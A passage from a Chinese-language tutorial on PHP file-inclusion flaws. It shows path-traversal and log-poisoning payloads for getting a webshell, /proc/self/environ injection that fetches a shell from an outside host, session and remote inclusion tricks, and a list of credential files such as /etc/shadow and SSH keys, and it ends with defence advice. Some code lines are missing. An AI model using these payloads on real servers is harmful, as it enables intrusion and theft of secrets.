    C:WINDOWSsystem32Logfiles
(4) IIS7.0+win2003 默认日志文件
    %SystemDrive%inetpublogsLogFiles
(5) nginx 日志文件在用户安装目录的logs目录下
如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里
也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）
**2）web中间件默认配置**
(1) apache+linux 默认配置文件
    /etc/httpd/conf/httpd.conf
或者
    index.php?page=/etc/init.d/httpd
(2) IIS6.0+win2003 配置文件
C:/Windows/system32/inetsrv/metabase.xml
(3) IIS7.0+WIN 配置文件
C:WindowsSystem32inetsrvconfigapplicationHost.config
**3）网站配置文件**
dedecms数据库配置文件data/common.inc.php,
discuz全局配置文件config/config_global.php,
phpcms配置文件caches/configs/database.php
phpwind配置文件conf/database.php
wordpress配置文件wp-config.php
用例1 包含日志一句话：
PayLoad：
    http://localhost/include/file.php?file=
日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/时，也会被记录在日志里，也可以插入到User-Agent
但是在日志里这句话被编码了
所以用Burp Suite修改来绕过编码
日志内容如下：
Payload：
    http://localhost/include/file.php?file=../../apache/logs/access.log
（这里利用相对路径，找到日志文件，并以php解析的方式打开了）
这样，日志就成了带有一句话的文件了。
参考：
包含日志文件getshell：
**4、包含/proc/self/environ文件**
用例：
**1）找到文件包含漏洞**
测试一下找出来
    www.aaa.com/view.php?page=../
    www.aaa.com/view.php?page=../../../../../etc/passwd
**2）检查proc/self/environ是否可用访问**
    www.aaa.com/view.php?page=../../../../../proc/self/environ
可访问就能利用了
**3）注入代码**
访问
    www.aaa.com/view.php?page=../../../../../proc/self/environ
选择User-Agent 写代码如下：
然后提交请求。
我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.
**4）访问shell即可**
参考：
LFI通过proc/self/environ直接获取webshell：http://www.linuxso.com/jiaobenruqin/1399.html
**5、包含Session文件**
说明：
这部分需要攻击者能够控制部分Session文件的内容。PHP默认生成的Session文件一般存放在/tmp目录下。
session文件一般在/tmp目录下，格式为sess_[your phpsessid
value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell。
读取session文件：
    ?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2
**四、 防御与绕过**
**1、00字符截断(PHP 
我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
而利用"./"的方式即可构造出超长目录字符串:
除了incldue()等4个函数之外，PHP中能够对文件进行操作的函数都有可能出现漏洞。虽然大多数情况下不能执行PHP代码，但能够读取敏感文件带来的后果也是比较严重的。例如:
fopen()、fread()
**3、任意目录遍历**
除了这种攻击方式，还可以使用"../../../"这样的方式来返回到上层目录中，这种方式又被称为"目录遍历(Path
Traversal)"。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)
防御方法:
目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。
open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)
比如在没有设置open_basedir时，文件包含漏洞可以访问任意文件。
当设置了open_basedir时，则包含文件失败。
**4、问号截断**
这里看似将路径的后半段都定死了，但是结合HTTP传参的原理可以绕过去
攻击者可以构造类似如下的攻击URL：
    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
产生的原理:
    /?path=http://localhost/test/solution.php?
最终目标应用程序代码实际上执行了:
    require_once "http://localhost/test/solution.php?/action/m_share.php";
(注意，这里很巧妙，问号"?"后面的代码被解释成URL的querystring，这也是一种"截断"思想，和%00一样)
攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合
防御思路:
关闭远程文件包含的配置选项allow_url_include = Off
参考：
LFI、RFI、PHP封装协议安全问题学习：
**五、 敏感文件位置**
**1、Windows：**
      C:boot.ini  //查看系统版本
      C:WindowsSystem32inetsrvMetaBase.xml  //IIS配置文件
      C:Windowsrepairsam  //存储系统初次安装的密码
      C:Program Filesmysqlmy.ini  //Mysql配置
      C:Program Filesmysqldatamysqluser.MYD  //Mysql root
      C:Windowsphp.ini  //php配置信息
      C:Windowsmy.ini  //Mysql配置信息
      ...
**2、Linux：**
      /root/.ssh/authorized_keys
      /root/.ssh/id_rsa
      /root/.ssh/id_ras.keystore
      /root/.ssh/known_hosts
      /etc/passwd
      /etc/shadow
      /etc/my.cnf
      /etc/httpd/conf/httpd.conf
      /root/.bash_history
      /root/.mysql_history
      /proc/self/fd/fd[0-9]*(文件标识符)
      /proc/mounts
      /porc/config.gz
**六、 防御方法总结**
1、无需情况下设置allow_url_include和allow_url_fopen为关闭
2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir
3、尽量不使用动态包含
4、严格检查变量是否已经初始化。
5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。
6、严格检查include类的文件包含函数中的参数是否外界可控。
7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。
8、在发布应用程序之前测试所有已知的威胁。